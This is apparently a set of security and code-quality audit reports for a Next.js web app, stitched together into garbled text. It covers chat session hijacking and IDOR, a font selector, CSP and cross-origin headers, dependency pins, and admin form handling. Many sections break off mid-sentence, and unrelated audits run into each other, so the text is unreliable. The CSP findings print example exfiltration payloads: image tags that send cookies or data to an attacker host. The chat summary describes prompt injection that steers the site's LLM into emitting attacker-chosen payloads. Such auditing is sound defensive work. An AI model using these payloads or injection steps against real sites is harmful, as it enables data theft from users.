      ChatMessage, AiProvider models)

Final verdict:
  All 10 audit questions FAIL (8 HIGH, 1 MED, 1 PARTIAL-MED).
  Plus 6 additional findings (2 MED, 4 LOW).
  The chat subsystem is the weakest part of the application audited
  so far. The combination of:
    Q1 (session hijack via sessionId — cuid, no auth binding) +
    Q2 (unauthenticated IDOR on /api/chat/messages — leaks admin
       replies) +
    Q5 (no sanitization of LLM output — stored XSS surface) +
    Q4 (prompt injection — system prompt contains admin email)
  means that an attacker who obtains a single sessionId can:
    - Read a victim's full chat history (Q2)
    - Read any admin replies sent via Bale /chat command (Q2)
    - Inject arbitrary content that gets stored and rendered to
      both the victim and the admin (Q4 + Q5)
    - Manipulate the LLM into emitting attacker-chosen payloads
      via prompt injection (Q4)
    - Drain LLM budget quadratically via unbounded history replay
      (Q3 + Q7), bypassing the rate limit via X-Forwarded-For
      spoofing (prior audit Q11/F-9, still open)
  Independently:
    Q9 (SSRF + API key exfiltration via baseUrl) and Q8 (no fetch
    timeout) together enable a worker-starvation DoS that requires
    only admin-panel access (itself weakly protected per prior
    audit V17.3-SEC-02 Q3 middleware-bypass + Q4 /api/admin/* not
    rate-limited F-5).

  Cross-references to prior findings (worklog):
    - V17.3-SEC-02 Q11/F-9 (X-Forwarded-For trusted blindly)
        → Q7 (rate-limit bypass), F-A (memory leak amplification)
    - V17.3-SEC-02 Q3/F-1  (HMAC check missing in middleware)
        → Q9 (admin gating is the only barrier to baseUrl SSRF;
          middleware bypass is still possible with forged-cookie-
          shape, though API layer verifies HMAC)
    - V17.3-SEC-02 Q4/F-5  (/api/admin/* not rate-limited)
        → Q9 (admin brute-force to gain baseUrl control)
    - V17.3-SEC-02 Q10/F-25 (loginAttempts Map no sweep)
        → F-A (chat rate-limit Map has the same defect, also no
          sweep)
    - V17.3-SEC-02 Q8      (HSTS missing behind TLS proxy)
        → Q1 (sessionId interception via network eavesdropping
          if HTTPS not enforced at edge)
    - V17.3-SEC-02 Q12     (CSP missing on error responses)
        → Q5 (if any input is ever reflected in an error path,
          stored XSS would execute — defense-in-depth gap)
    - V17.4-SEC-04 #6      (/api/chat CSRF, LLM cost amplification)
        → Q3, Q7 (this audit confirms and extends the cost-
          amplification vector with quadratic-history dimension)
    - V17.4-SEC-04 #6.5    (sessionId hijack noted as MED for UX)
        → Q1 (this audit raises to HIGH due to Q2 IDOR amplification)
    - V17.4-SEC-04 #6.6    (visitorId not bound to same-origin)
        → Q10 (this audit raises to MED due to Bale markdown
          injection + admin-panel XSS surface)

Q2. selectFont persists?
----------------------------------------------------------------
Status: PASS
Evidence: src/components/FontSelector.tsx:28-32

  28: function selectFont(fontId: string) {
  29:   setCurrentFont(fontId);
  30:   localStorage.setItem("site_font", fontId);
  31:   document.documentElement.setAttribute("data-font", fontId);
  32: }

Persists to localStorage under key "site_font". ✅

Key observations:
  - Storage key is hardcoded ("site_font", line 24 & 30). No namespacing
    per user/language/version. If two language deployments share the
    same origin, they collide.
  - No try/catch around localStorage.setItem (line 30). In private-
    browsing mode or when storage quota is exceeded, this THROWS —
    uncaught, breaks the click handler. (LOW severity)


Q3. Applies to <html data-font>?
----------------------------------------------------------------
Status: PASS
Evidence: src/components/FontSelector.tsx:31

  31: document.documentElement.setAttribute("data-font", fontId);

Applies data-font attribute to <html> element. ✅

Note: This is the ONLY place the attribute is set. There is no
SSR/server-side code applying the attribute based on a cookie
or header — meaning the very first render after a page load
does NOT have data-font applied (SSR renders <html> without the
attribute). The attribute is applied only after a user CLICK,
or never if the saved value isn't re-applied (see Q4 bug).


Q4. Loads saved on mount?
----------------------------------------------------------------
Status: PARTIAL FAIL
Evidence: src/components/FontSelector.tsx:23-26

  23: useEffect(() => {
  24:   const saved = localStorage.getItem("site_font") || "vazirmatn";
  25:   setCurrentFont(saved);
  26: }, []);

Reads saved value into React state on mount. ✅ (state is loaded)

BUG: The useEffect loads `saved` into the React state
(currentFont) ONLY. It does NOT re-apply the data-font
attribute to <html>. So after a page reload:
  - currentFont state = saved (e.g., "lora")
  - the "Lora" button shows as active ✅
  - but <html data-font="..."> is STILL unset (whatever SSR
    produced) — so the page does NOT actually render in the
    saved font until the user clicks another font button
    (which re-runs selectFont → line 31 sets the attribute).

This means the persisted setting is correctly stored and the
active button reflects it, but the FONT IS NOT VISUALLY
APPLIED on reload. The user sees the default font until they
re-click. This breaks the persistence contract from the user's
perspective.

Missing line 26.5 (conceptually):
  document.documentElement.setAttribute("data-font", saved);

Severity: HIGH (defeats the entire purpose of persistence)


Q5. Preview?
----------------------------------------------------------------
Status: PARTIAL FAIL
Evidence: src/components/FontSelector.tsx:68-73

  68: <div style={{ marginTop: 16, padding: 12, background: "var(--bg)",

  74:   </div>

A preview section EXISTS — there is a labeled "پیش‌نمایش:" box showing
mixed Persian + English + digits. ✅ (preview exists)

BUG: The preview div (lines 72-74) has NO inline fontFamily style
and NO data-font attribute of its own. The preview text inherits
font-family from <html data-font="..."> globally. So:

  (a) The preview DOES reflect the currently-active global font
      (because data-font on <html> cascades down). ✅
  (b) BUT the preview does NOT preview a font BEFORE clicking —
      there's no onHover handler that locally previews the
      hovered font. The user has to click to see a font change.
  (c) AND because of the Q4 bug, after a page reload the preview
      shows the DEFAULT font (not the saved one) until the user
      re-clicks.

A proper preview would bind `style={{ fontFamily: <font-family-for-currentFont> }}`
or apply data-font to the preview div itself so it's isolated from
the global state.

Severity: MED (preview exists but is misleadingly decoupled from
the per-button selection)

No way to switch UI language to all-English or all-Persian based

Q7. Loading state?
----------------------------------------------------------------
Status: FAIL
Evidence: src/components/FontSelector.tsx:20-26

  20: export default function FontSelector() {
  21:   const [currentFont, setCurrentFont] = useState("vazirmatn");
  22:
  23:   useEffect(() => {
  24:     const saved = localStorage.getItem("site_font") || "vazirmatn";
  25:     setCurrentFont(saved);
  26:   }, []);

No loading state. No `isLoading`/`loading` boolean. No skeleton.
No placeholder while the saved value is being read.

The state initializes to "vazirmatn" (line 21), and useEffect
runs after mount to potentially overwrite it (line 25). During the
very first render, the "Vazirmatn" button is active — even if the
saved value was "lora". There's a brief flash where the active
button is wrong.

Additionally, since the component is "use client" (line 8),
SSR will render with currentFont="vazirmatn", then the client
hydrates and the useEffect updates state → React re-renders
with the new active button. This is a hydration-mismatch
RISK if the SSR-rendered HTML and client-rendered HTML differ
on which button has the "active" class. In practice, React
suppresses this for useEffect-driven updates (no warning),
but the visual flash is real.

No skeleton/spinner is shown while localStorage is being
read. Even though localStorage access is synchronous and
fast, the FIRST paint shows the wrong active state.

Severity: LOW (cosmetic flash; no functional breakage)

================================================================
ROOT-CAUSE ANALYSIS
================================================================
The component is functionally MOSTLY working — selecting a font
persists it and applies it. The two real bugs are:

  (a) Q4 (HIGH): the useEffect at lines 23-26 reads `saved` into
      state but never re-applies the data-font attribute to <html>.
      After a page reload, the user sees the DEFAULT font until
      they click any font button. The fix is a one-line addition
      inside the useEffect:
        document.documentElement.setAttribute("data-font", saved);

  (b) Q5 (MED): the preview div (lines 72-74) is decoupled from
      the per-button selection — it only reflects the globally-
      applied font, which (because of bug a) is wrong on reload.
      A proper preview would either:
        * Bind fontFamily on the preview div to the HOVERED font
          (onMouseEnter → previewFont state → fontFamily on div)
        * OR bind fontFamily on the preview div to currentFont
          so the preview reflects what will be applied on click.

Both bugs are independent but compound each other: Q4 makes Q5
worse (preview is wrong on reload).

Q6 (no lang prop) and Q7 (no loading state) are design/consistency
issues, not functional bugs — they don't break the component but
they break the project's i18n pattern (per prior audit V17.4-FINAL
mentioned `title[lang] → titleLangKey` migration) and produce
visual flashes.

  Line 112: default-src 'self'                                  ✅
  Line 114: script-src 'self' 'unsafe-inline' 'unsafe-eval'
            https://www.google.com https://www.gstatic.com     ❌ BOTH
            'unsafe-inline' AND 'unsafe-eval' present — these
            gut the protection CSP is meant to provide. Next.js
            production builds do NOT require 'unsafe-eval';
            'unsafe-inline' should be replaced with per-request
            nonces (Next.js 13+ supports nonce-based CSP via
            middleware injecting a nonce and the framework
            attaching it to inline scripts/styles).

  Line 118: font-src 'self' data: https://fonts.gstatic.com     ✅
  Line 120: img-src 'self' data: blob: https:                   ❌ bare

            image host on the internet is allowed. Should be
            an explicit allowlist (the project's own CDN,
            known avatar hosts, etc.). Enables data exfil via
            <img src="https://attacker/leak?data=...">.

  Line 124: connect-src 'self' https://www.google.com
            https://www.gstatic.com                               ⚠️ OK for
            client-side (LLM calls are server-side so don't need
            to be in connect-src), but missing wss: for any
            future WebSocket usage and missing analytics endpoints.
  Line 126: object-src 'none'                                    ✅

  Line 130: form-action 'self' https://formsubmit.co            ✅
  Line 132: frame-ancestors 'none'                              ✅

Missing directives:

  - require-sri-for             (no subresource-integrity mandate)
  - manifest-src                (defaults to default-src 'self' — acceptable)
  - worker-src                  (defaults to default-src 'self' — acceptable, but
                                 explicit declaration is best practice)
  - report-uri / report-to      (no CSP-violation reporting — silent failures)

Coverage gap #1 — error responses:
  The CSP is set ONLY on the success path at src/middleware.ts:209
  (NextResponse.next()). All early-return error responses call
  addSecurityHeaders(res) (src/middleware.ts:98-106) which does NOT

Coverage gap #2 — static files excluded by matcher:
  src/middleware.ts:220-228 — the matcher excludes:

  These paths NEVER receive CSP. For .js/.css files this is fine

    rather than set to "".

9. COOP / COEP / CORP (Cross-Origin Isolation)
================================================================
Verdict: FAIL  | Severity: MED

ALL THREE cross-origin isolation headers are MISSING from both files:

  Cross-Origin-Opener-Policy (COOP):
    - next.config.ts:    NOT DEFINED
    - src/middleware.ts: NOT DEFINED
    Recommended: `Cross-Origin-Opener-Policy: same-origin`
    Prevents cross-origin windows from holding references to the
    site's window object (Spectre-class defense, prevents
    cross-origin window.opener attacks).

  Cross-Origin-Embedder-Policy (COEP):
    - next.config.ts:    NOT DEFINED
    - src/middleware.ts: NOT DEFINED
    Recommended: `Cross-Origin-Embedder-Policy: require-corp`
    Requires all subresources to opt into cross-origin loading
    via CORP or CORS. Enables SharedArrayBuffer / high-resolution
    timers (used by some advanced features).
    ⚠️ Setting COEP=require-corp would break the YouTube/Aparat/
    Vimeo frame-src allowlist (src/middleware.ts:122) unless
    those iframes have CORP headers — they generally do NOT.
    So COEP=require-corp is incompatible with the current
    frame-src config without credentialless mode
    (`COEP: credentialless` is a softer alternative).
    Decision needed: either (a) accept that COEP can't be
    require-corp due to third-party embeds, or (b) drop the
    third-party embeds and enable COEP.

  Cross-Origin-Resource-Policy (CORP):
    - next.config.ts:    NOT DEFINED
    - src/middleware.ts: NOT DEFINED
    Recommended: `Cross-Origin-Resource-Policy: same-origin`
    (or `same-site` for cross-origin subresource scenarios)
    Should be set on static assets (_next/static/*, images, etc.)
    to prevent them from being loaded cross-origin by an
    attacker-controlled page (Spectre data leakage defense).

Net: zero cross-origin isolation. The site is vulnerable to
Spectre-class side-channel attacks where a malicious page in
the user's browser can read the site's resources cross-origin
via SharedArrayBuffer / speculative-execution timing attacks.

    MITM/proxy that doesn't honor implicit no-cache.
  - The /user-dashboard redirect response (src/middleware.ts:183)
    has NO Cache-Control — a 302 to /user-login could be cached
    by an intermediate proxy, causing logged-in admins to be
    perpetually redirected away from their dashboard until
    cache expiry.

Best practice (advisory — DO NOT apply per task instructions):
  For all admin paths:
    Cache-Control: no-store, no-cache, must-revalidate, private
    Pragma: no-cache              (legacy HTTP/1.0 compatibility)
    Expires: 0                    (legacy HTTP/1.0 compatibility)
  Should be applied both in:
    - next.config.ts headers() with `source: "/user-dashboard/(.*)"`
      and `source: "/api/admin/(.*)"` and `source: "/api/messages"
    - src/middleware.ts addSecurityHeaders() — conditionally,
      only when the request path matches admin paths, OR
      unconditionally (since admin paths are the highest-sensitivity
      content; non-admin paths can also benefit from no-store
      semantics for personalized content).

Cross-ref: prior audit V17.3-SEC-02 / V17.4-FINAL did NOT cover
Cache-Control on admin paths. This is a NEW finding.

----- N-A. /user-dashboard redirect bypasses ALL security headers
       [MED] -----
Location: src/middleware.ts:182-184

Code:
  182:    const loginUrl = new URL("/user-login", req.url);
  183:    return NextResponse.redirect(loginUrl);
  184:  }

Analysis:
  - The 302 redirect returned when an unauthenticated user hits
    /user-dashboard is created via NextResponse.redirect() and
    returned WITHOUT calling addSecurityHeaders().
  - Therefore the redirect response is missing ALL of:
    CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy,
    Permissions-Policy, X-XSS-Protection, X-Powered-By handling,
    HSTS, Cache-Control.
  - Same pattern at the rate-limit / CSRF / 401 / 413 returns:
    those DO call addSecurityHeaders (so they get 5 of the headers)
    but STILL miss CSP and HSTS (which are set only on the success
    path). See finding #1 and #4 above.
  - Severity MED because redirects are short-lived and the body is
    empty, so exploitation requires a sophisticated MITM timing
    attack — but the inconsistency is a defense-in-depth failure.

----- N-B. Permissions-Policy formatted with comma+space separators
       [LOW, informational] -----
Location: src/middleware.ts:102, next.config.ts:22

Code:
  camera=(), microphone=(), geolocation=(), payment=()

Analysis:
  - The Permissions-Policy spec uses comma separators between
    features. The current format with ", " (comma + space) is
    accepted by all major browsers (they're lenient with whitespace),
    so this is NOT a functional bug.
  - However, some strict validators / scanners flag the space.
    Best practice: omit the space. Advisory only.

----- N-C. CSP script-src allows 'unsafe-eval' (Next.js dev only)
       [MED] -----
Location: src/middleware.ts:114

Analysis:
  - 'unsafe-eval' is required by Next.js only in DEV mode (for
    HMR / fast refresh). In production builds (the deployment
    target per next.config.ts:4 `output: "standalone"`),
    'unsafe-eval' is NOT needed and removing it would block
    many DOM-based XSS attacks that rely on eval(), new Function(),
    setTimeout("string"), etc.
  - Currently 'unsafe-eval' is in the CSP for all environments.
  - Fix would be to gate 'unsafe-eval' behind process.env.NODE_ENV
    === "development" — but task instructions forbid fixes here.

----- N-D. img-src allows bare 'https:' wildcard
       [MED] -----
Location: src/middleware.ts:120

Analysis:
  - "img-src 'self' data: blob: https:" — the trailing `https:`
    (no host) is a scheme-source that matches ANY https URL.
    An attacker can do <img src="https://attacker.com/log?
    cookie=..."> and the CSP allows it. This bypasses the
    "default-src 'self'" intent for image-based data exfiltration.
  - Should be replaced with an explicit host allowlist (e.g.,
    https://images.(project-domain), https://*.gravatar.com,
    https://avatars.githubusercontent.com, etc.) — advisory.

----- N-E. No CORS headers audited (out of scope, noted for completeness)
       [LOW, informational] -----
  - The task did not ask about Access-Control-Allow-Origin / CORS.
  - Quick note: neither next.config.ts nor src/middleware.ts sets
    any CORS headers. This is appropriate for a same-origin site.
    If any API route is ever consumed cross-origin, route-level
    CORS would need to be added — not currently a finding.

Q2. Pinned versions?
----------------------------------------------------------------
Status: FAIL (mixed)
Severity: LOW

Finding:
  - package.json uses CARET (^) ranges on every dep — NO exact pins.
    Examples: "next": "^16.1.1", "bcryptjs": "^3.0.3", "react": "^19.0.0".
  - bun.lock DOES pin exact resolved versions with SHA-512 integrity
    hashes for every transitive package (e.g. "next@16.3.6" with sha512
    "L+otWM/aQbYTx98aZhgEoMb4bZAXx1YVW4UMA/vuCyCoWG5HJyZUili8QAkqzr…").
    So installs are reproducible AS LONG AS `bun install --frozen-lockfile`
    is used.
  - RISK: a fresh `bun install` (without --frozen-lockfile) on a new
    machine could resolve to a NEWER patch than the tested 16.3.6 /
    6.19.3 / 3.0.3 — possibly introducing a regression or new vuln
    before anyone notices.
  - @tailwindcss/postcss "^4" and "tailwindcss" "^4" are the loosest
    pins (any 4.x.x). Both currently resolve to 4.3.3; a future 4.4.0
    with breaking defaults could silently shift styling. Tailwind v4
    has no major-minor stability promise for config semantics.
  - typescript "^5" — same risk; a 5.10 → 5.20 jump could tighten type
    checks and break the build.

Recommendation (advisory only, NOT applied):
  - Either pin exact versions in package.json (drop the ^), OR
    enforce `bun install --frozen-lockfile` in install.sh + CI.
  - At minimum, pin `tailwindcss` and `typescript` to the current
    minor ("4.3.3" and "5.x.x") since those are most likely to
    silently break on minor bumps.

Q5. bcryptjs safe?
----------------------------------------------------------------
Status: PASS
Severity: N/A

  - Version: bcryptjs@3.0.3 (resolved in bun.lock line 168).
  - This is the SAFE branch. CVE-2020-7707 (timing attack in `compare`
    due to non-constant-time early-exit) affected bcryptjs ≤2.4.0.
    Fixed in 3.0.0. 3.0.3 is the latest 3.x release (no later 3.x CVEs).
  - Pure-JS implementation (no native binding) — slower than native
    `bcrypt` or `argon2`, but no ABI risk. For this project's
    low-traffic admin/access-user auth, perf is acceptable.
  - Usage in src/lib/access-auth.ts:
      line 51: `const salt = await bcrypt.genSalt(10);`
      line 52: `return bcrypt.hash(password, salt);`
      line 59: `return bcrypt.compare(password, hash);`
    - saltRounds=10 → 2^10 = 1024 iterations. This is the OWASP-minimum
      recommendation. Acceptable. (Could bump to 12 for ~4× slower
      brute-force, but 10 is not a vulnerability.)
    - compare() uses bcrypt's constant-time compare internally. ✅
  - No usage of the deprecated/insecure `hashSync`/`compareSync` APIs
    with raw salt — all async via genSalt+hash. ✅
  - Password length not capped before bcrypt.hash(): bcryptjs truncates
    at 72 bytes by spec (matches native bcrypt behavior). Not a vuln,
    just informational — long passwords (>72 bytes) effectively hash
    only the first 72 bytes. (Prior audits V17.3-SEC-02 already noted
    this is consistent with native bcrypt semantics.)

Verdict: bcryptjs IS SAFE at 3.0.3 with the current usage pattern.

    (no `next/image` usage in src/) — all images are served via
    raw <img> / CSS. So sharp is never invoked; it just bloats the
    install.
  - This is UNCHANGED from V17.1-FINAL / V17.2 / V17.4-SEC-04 #3,#12.
    Despite three prior worklog claims of "حذف sharp (37MB)" (lines
    5488, 12675, 12932), sharp is STILL installed and STILL ~37 MB.
    The published install-v17.X.zip files were manually pruned to
    exclude @img/, but this pruning is NOT codified in package.json
    or .npmrc — a fresh `bun install && bun run build` re-introduces
    the bloat. (Same finding as V17.4-SEC-04 #12.)
  - Recommendation (advisory only, NOT applied):
      Option A (cleanest): add to package.json:
        "overrides": { "sharp": false }
      Option B (runtime-safe): set in next.config.ts:
        images: { unoptimized: true }
      AND exclude sharp from the standalone trace (post-build rm -rf
      node_modules/sharp node_modules/@img).
      Option C: `bun install --omit=optional` in install.sh + CI.

Analysis:

  - package.json declares `"lint": "eslint ."` but neither `eslint`

  - ⇒ `bun run lint` / `npm run lint` will fail with
    "eslint: command not found" on any environment that didn't
    manually `bun add -d eslint` outside the lockfile.
  - Next.js 16 removed the bundled `next lint` command (it was
    deprecated in 15, removed in 16). Projects must self-install
    eslint. This project's lint script is therefore dead code.
  - Impact: no automated style/type-narrowing enforcement; silent
    drift between worklog claims and code. Cross-refs many prior
    audits' "lint would have caught this" comments.

----- F-B. prisma CLI misplaced in dependencies  [LOW] -----
Location: package.json:19 ("prisma": "^6.11.1" under `dependencies`)

Analysis:

    in src/ (verified via grep — 0 hits for `from "prisma"`).
  - Runtime code uses @prisma/client (correctly in `dependencies`).
  - Misplacement inflates the production install/standalone trace by

----- F-C. tailwindcss "^4" and typescript "^5" are too loose  [LOW] -----
Location: package.json:24,28

Analysis:
  - "tailwindcss": "^4" allows any 4.x.x → currently 4.3.3.
    Tailwind v4 has had breaking defaults changes between minor
    releases (e.g., 4.0 → 4.1 changed default border-color behavior).
    A silent 4.3.3 → 4.4.0 jump could shift styles.
  - "typescript": "^5" allows any 5.x.x → could tighten type checks
    on a minor bump and break the build.
  - Recommend pinning to current minor: "tailwindcss": "~4.3.3"
    (or exact "4.3.3") and "typescript": "~5.x.x".

Analysis:

     because the network actually succeeded; the server is just broken.

----- 8. expiresAt saved (line 162) -----
Status: PASS with caveats

Code:
  162: expiresAt: form.expiresAt ? new Date(form.expiresAt).toISOString() : null,

Pre-fill on edit (line 126):
  126: expiresAt: user.expiresAt ? new Date(user.expiresAt).toISOString().slice(0, 10) : "",

UI input (lines 414-425):
  416: <input type="date" value={form.expiresAt} ... />

Display in table (lines 505-508):
  506-508: user.expiresAt ? new Date(user.expiresAt).toLocaleDateString("fa-IR") : "—"

Analysis:
  ✅ Empty form value → null (line 162)
  ✅ Non-empty → ISO string (line 162)
  ✅ Pre-fill correctly extracts YYYY-MM-DD from ISO (line 126:
     `.toISOString().slice(0, 10)`)
  ✅ Display uses Persian locale (line 507)
  ⚠️ Line 162: `new Date(form.expiresAt)` — `type="date"` returns
     "YYYY-MM-DD" which is parsed as UTC midnight. The stored
     `expiresAt` is `2026-12-31T00:00:00.000Z`. If the server checks
     `expiresAt < now()` to deny access, the user is denied access
     starting at midnight UTC on the expiry date — which may be the
     evening BEFORE in local Iran time (UTC+3:30). Off by ~4 hours.
     UI doesn't expose time-of-day, so admins can't pick "end of day".
  ⚠️ Line 126: `new Date(user.expiresAt).toISOString().slice(0, 10)`
     — if `user.expiresAt` is a legacy non-ISO string (e.g.,
     "2026/12/31"), `new Date(...)` may return Invalid Date, and
     `.toISOString()` throws RangeError. Pre-fill would crash the
     form. Server should always return ISO, but no client-side guard.
  ⚠️ Line 162: no validation that expiresAt is in the future. User
     can save an expiry date in the past — meaning the user is
     immediately expired upon creation. UI doesn't warn.
  ⚠️ Line 416: `type="date"` — older browsers (IE, some embedded
     webviews) don't support this and fall back to text input.
     No graceful degradation.
  ⚠️ No timezone display. Admin sees "1404/10/10" (Persian date) in
     the table but the underlying value is UTC. If admin intends
     "expires end of Persian day 10/10", they may pick a date that
     actually expires 4-20 hours earlier than intended in local time.

Cross-ref: V17.3-SEC-02 (session validation in middleware) — if the
  middleware checks `expiresAt`, the UTC-vs-local mismatch here
  could cause premature denial of access.

----- 10. credentials: 'include' -----
Status: PASS

All four fetch() calls in the file:
  Line  87: fetchUsers    → credentials: "include" ✅
  Line 104: fetchLogs     → credentials: "include" ✅
  Line 174: handleSubmit  → credentials: "include" ✅
  Line 203: handleDelete  → credentials: "include" ✅

Analysis:
  ✅ Every fetch includes credentials: "include".
  ✅ This ensures the admin session cookie (access_session, set by
     /api/user-login per the file header comment lines 11-13) is sent
     with each request.
  ⚠️ No cookie attribute assumptions checked client-side. If the
     cookie is misconfigured as SameSite=None;Secure, cross-site
     requests would carry it — CSRF surface. (Server-side SameSite
     is the proper mitigation; client cannot enforce.)
  ⚠️ No fallback to `Authorization` header. If credentials: "include"
     is stripped by a CSP / browser policy / proxy, the requests
     silently fail authentication. No client-side detection.
  ⚠️ Cache-Control / Next.js cache concern:
       - `cache: "no-store"` is used on fetchUsers (line 87) and
         fetchLogs (line 104). ✅
       - handleSubmit (line 171) and handleDelete (line 203) don't
         set `cache` — that's OK because POST/PUT/DELETE aren't
         cacheable by default, but explicit is better than implicit.

Cross-ref: V17.3-SEC-02 Q3 (middleware HMAC check) — even with
  credentials sent, the middleware validates only the cookie shape,
  not the HMAC. The API layer (admin-auth.ts:17-31 per V17.4-SEC-12
  Q9 cross-ref) does verify the HMAC. So credentials: "include"
  alone is necessary but not sufficient for security; the server-
  side check is the real gate.

    server_error. Defensive note only; not triggerable from UI.

----- 4. deleteClip (handleDelete, lines 88-101) — data.ok check -----
Status: **FAIL** — CRITICAL

Code:
  88:  async function handleDelete(id: string) {
  89:    if (!confirm("حذف این کلیپ؟")) return;
  90:    try {
  91:      await fetch("/api/admin/clips", {
  92:        method: "DELETE",
  93:        headers: { "Content-Type": "application/json" },
  94:        credentials: "include",
  95:        body: JSON.stringify({ id }),
  96:      });
  97:      fetchClips();
  98:    } catch (e) {
  99:      alert("خطا در حذف");
 100:    }
 101:  }

Findings:
  - ❌ **`data.ok` is NEVER CHECKED.** The fetch result is THROWN AWAY — the
    code does `await fetch(...)` without assigning it, without calling
    `.json()`, without checking `res.ok` or `data.ok`. Confirmed at
    AparatClipManager.tsx:91-96.
  - ❌ `fetchClips()` (line 97) is called UNCONDITIONALLY after the fetch
    resolves, regardless of HTTP status or response body. The UI refreshes
    as if the delete succeeded even when it failed at the server.
  - ✅ Only network-level errors (when fetch() throws — DNS failure, CORS
    preflight failure, connection refused, etc.) are caught at line 98 and
    surfaced via `alert("خطا در حذف")` (line 99).
  - ✅ `confirm()` (line 89) provides user confirmation before delete.

Impact scenarios:
  (a) Session expired mid-session (401 from route.ts:78-79):
      DELETE returns `{ ok: false, error: "unauthorized" }` with HTTP 401.
      The manager ignores this, calls fetchClips(), which ALSO 401s,
      sets error="unauthorized" (line 48). The user sees a flash of
      "unauthorized" in the list view, but the delete button gave no
      immediate feedback — user thinks delete succeeded, clip reappears
      (because fetchClips failed too). Confusing UX.
  (b) Server-side error (500 from route.ts:89-90, e.g., Prisma error if
      the clip was deleted concurrently): DELETE returns
      `{ ok: false, error: "server_error" }` with HTTP 500. The manager
      ignores this, calls fetchClips(), the clip is STILL in the list.
      User gets NO error feedback — they believe delete failed silently
      because the clip didn't disappear, but the message they got was
      "nothing happened" rather than an error.
  (c) Network error (fetch throws): caught → alert("خطا در حذف"). This
      is the only path that gives the user feedback. ⚠️ Uses `alert()`
      which is blocking and inconsistent with the in-page error banner
      used by fetchClips/handleSubmit.

Server side (route.ts:74-92) confirms the contract:
  - Returns `{ ok: true }` on success (line 87).
  - Returns `{ ok: false, error: "unauthorized" }` on 401 (line 79).
  - Returns `{ ok: false, error: "server_error" }` on 500 (line 90).
  The client simply never reads these.

Severity: HIGH (data-integrity + UX). The audit item asked specifically
whether `data.ok` is checked — answer: NO. This is the most severe
finding in this audit.

----- 6. embedCode sanitized -----
Status: NOT SANITIZED at storage; consumer-side sanitization only

In AparatClipManager.tsx:
  - ❌ **No sanitization at storage time.** The embedCode textarea
    (lines 157-164) is bound to `form.embedCode` (line 159), which is
    sent verbatim via the form spread at line 64:
      61: const body = {
      62:   action: editing ? "update" : "create",
      63:   id: editing?.id,
      64:   ...form,           // ← embedCode sent RAW
      65: };
  - The server stores it raw (route.ts:42, 57: `String(body.embedCode || "")`).
  - ✅ In the LIST view (line 264), embedCode is rendered inside a
    React text node:
      263: <code style={{ ... }}>
      264:   {clip.embedCode.slice(0, 80)}...
      265: </code>
    React's default text-node escaping prevents XSS here. Safe.
  - ✅ In the FORM textarea (lines 157-164), embedCode is bound via
    `value={form.embedCode}` — React controlled component, no XSS.
    Safe.
  - ✅ NO `dangerouslySetInnerHTML` usage anywhere in
    AparatClipManager.tsx. Confirmed by grep — zero matches.

Consumer-side protection (outside the audited file, but relevant):
  - The PUBLIC page src/app/clips/page.tsx:57 renders the embed via:
      57: <div ... dangerouslySetInnerHTML={{ __html: sanitizeEmbed(clip.embedCode) }} />
    `sanitizeEmbed` (src/lib/sanitize-embed.ts:17-42) extracts only the
    `<iframe src="...">` tag, validates the src hostname against an
    allowlist (aparat.com, youtube.com, youtu.be, vimeo.com —
    sanitize-embed.ts:8-15), and rebuilds a clean iframe. Defense-in-
    depth at the consumer side. ✅
  - HOWEVER: this means the protection is entirely on the public page.
    The stored DB value is dirty (raw admin input). If any future
    admin interface, API endpoint, or rendering surface outputs
    `clip.embedCode` without sanitization, it's a stored-XSS vector.
    The admin's own list view is safe today (React text node), but
    fragile.

Severity: LOW in current state (consumer-side sanitizer catches it),
but architecturally fragile — sanitization belongs at storage too
(defense-in-depth). Note: the admin user is privileged, so stored-XSS
in the admin panel is lower-severity than on the public site. The
public site IS protected.

----- 7. credentials: 'include' -----
Status: PASS

All three fetch calls correctly include `credentials: "include"`:
  - fetchClips GET — AparatClipManager.tsx:43
  - handleSubmit POST — AparatClipManager.tsx:71
  - handleDelete DELETE — AparatClipManager.tsx:94

Without this, the admin session cookie (set by /api/admin/login) would
NOT be sent cross-origin (default `credentials: "same-origin"` would
still work for same-origin calls, but explicit "include" is the safe
default and signals intent).

Server side (route.ts:11, 30, 77) calls `checkAdminSession(req)` which
reads the cookie — so credentials are required. ✅ All three client
calls correctly send them.

----- 8. Loading state -----
Status: PARTIAL — initial fetch covered; create/update/delete not

Positive:
  - ✅ Initial state: `loading: true` (line 22). Before the first fetch
    resolves, the component renders the loading screen (lines 122-124):
      122: if (loading) {
      123:   return <div style={{ padding: 20, color: "var(--text-dim)" }}>در حال بارگذاری...</div>;
      124: }
  - ✅ `fetchClips` sets loading=true at start (line 40) and false at
    finally (line 53).
  - ✅ Error state initialized alongside loading (line 25).

Gaps:
  - ❌ **No loading state for create/update (handleSubmit).** The submit
    button (line 213) is NOT disabled during the fetch. The form's
    loading state isn't reused; there's no separate `submitting` state.
    Double-click risk → duplicate create.
  - ❌ **No loading state for delete (handleDelete).** The delete button
    (line 257) is NOT disabled during the fetch. The delete button has
    no visual feedback while the request is in flight.
  - ⚠️ **Loading-state flicker on every refetch.** Because
    `fetchClips()` is called after create/update/delete AND it sets
    `loading=true` (line 40), the ENTIRE list view is replaced by
    "در حال بارگذاری..." during the refetch window. After a successful
    create, the user sees: form closes → loading screen → list.
    The list does NOT update in-place — it disappears and reappears.
    UX jank. Better: skip the loading flag for refetches triggered by
    create/update/delete (use a separate `refreshing` state or pass
    a `silent` flag to fetchClips).

----- 9. Errors shown -----
Status: PARTIAL — fetchClips and handleSubmit show errors; handleDelete does NOT

Positive:
  - ✅ `error` state initialized to "" (line 25).
  - ✅ Error rendered in BOTH the form view (lines 136-140) and the list
    view (lines 228-232), as a red banner with `var(--red)` styling:
      136: {error && (
      137:   <div style={{ padding: 10, marginBottom: 16, background: "rgba(255,0,64,0.1)",
      138:        border: "1px solid var(--red)", color: "var(--red)", fontSize: 11, borderRadius: 4 }}>
      139:     {error}
      140:   </div>
      141: )}
  - ✅ fetchClips: sets error on data.ok===false (line 48) and on
    network catch (line 51).
  - ✅ handleSubmit: sets error on data.ok===false (line 81) and on
    network catch (line 84).
  - ✅ Error cleared at start of fetchClips (line 41) and handleSubmit
    (line 59) — prevents stale errors.

Gaps:
  - ❌ **handleDelete does NOT use the `error` state and does NOT show
    an in-page error banner on non-network failures.** Per audit item
    #4, the response is ignored entirely. Only network-level errors
    surface, and they use `alert("خطا در حذف")` (line 99) instead of
    the in-page error banner used everywhere else. INCONSISTENT UX:
      - fetchClips/handleSubmit errors → red banner in the page.
